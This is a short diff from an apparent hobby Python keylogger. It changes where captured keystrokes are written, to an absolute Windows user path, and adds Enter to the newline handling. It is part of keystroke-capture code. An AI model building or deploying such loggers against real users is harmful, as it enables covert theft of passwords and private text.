@@ -20,10 +20,10 @@ def on_release(key):
         return False
 
 def write_file(keys):
-    with open("keyLogs.txt","a+") as f:
+    with open(r"C:\Users\saiki\OneDrive\Coding files\My Python files\projects\Final\keylogger\keyLogs.txt","a+") as f:
         for key in keys:
             k = str(key).replace("'","")
-            if(k.find("space")>0):
+            if(k.find("space")>0 or k.find("enter") > 0):
                 f.write("\n")
             elif(k.find("Key") == -1):#if we find backspace ,ctl etc we will not store that
                 f.write(k)
